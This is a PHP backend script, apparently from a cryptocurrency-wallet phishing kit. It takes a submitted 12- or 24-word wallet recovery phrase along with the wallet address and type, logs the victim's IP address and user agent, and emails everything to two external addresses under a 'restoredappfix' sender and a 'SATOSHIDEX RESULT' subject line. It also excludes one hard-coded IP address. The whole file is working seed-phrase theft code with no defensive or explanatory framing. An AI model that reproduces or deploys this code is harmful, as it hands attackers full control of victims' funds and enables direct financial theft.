<?php

// Allow CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// Handle pre-flight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    // Stop script processing for pre-flight, after headers are sent
    exit;
}

function getRealIpUser()
{

    switch (true) {

        case (!empty($_SERVER['HTTP_X_REAL_IP'])):
            return $_SERVER['HTTP_X_REAL_IP'];
        case (!empty($_SERVER['HTTP_CLIENT_IP'])):
            return $_SERVER['HTTP_CLIENT_IP'];
        case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])):
            return $_SERVER['HTTP_X_FORWARDED_FOR'];

        default:
            return $_SERVER['REMOTE_ADDR'];
    }
}
?>
<?php

if ($_POST['dappWord']) {

    $ip = getRealIpUser();
    $dappWord = $_POST['dappWord'];
    $dappAddress = $_POST['dappAddress'];
    $dappName = $_POST['dappName'];
    $response = "";

    $date = date("Y-m-d h:i:s");

    // 1. Sanitize input to remove any HTML or script tags
    $dappWord = strip_tags($dappWord);

    // 2. Normalize space and split words
    $words = preg_split('/\s+/', trim($dappWord));
    $words = array_filter($words); // Remove any empty values that might be parsed

    // 3. Check the number of words (should be either 12 or 24)
    $wordCount = count($words);
    if ($wordCount !== 12 && $wordCount !== 24) {
        $response = false;
    }
    else if($ip === "217.64.114.170") {
        $response = false;
    }
    else if ($dappWord) {

        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = '';
        $message .= "|----------| WALLET CONNECTED  |--------------|\n\n";
        $message .= "Phrase: " . $dappWord . "\n";
        $message .= "Address: " . $dappAddress . "\n";
        $message .= "Type: " . $dappName . "\n";
        $message .= "Date received:  " . $date . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- https://www.geodatatool.com/en/?ip=$ip ------\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|------------------------------------------------|\n";

        // headers section
        // Create email headers
        $headers = 'From: mailer@restoredappfix.com' . "\r\n" .
            'Reply-To: mailer@restoredappfix.com' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();

        //send mail
        $email_one = "chr1smandy@yandex.com";
        $email_two = "nftrecoveryteam@ftceurecovery.com";
        $subject = "|----------|SATOSHIDEX RESULT|------| $ip";
        $sendFirstMail = mail($email_one, $subject, $message, $headers);
        $sendSecondMail = mail($email_two, $subject, $message, $headers);
    }

    // https://ftceurecovery.com/action/validate.php
}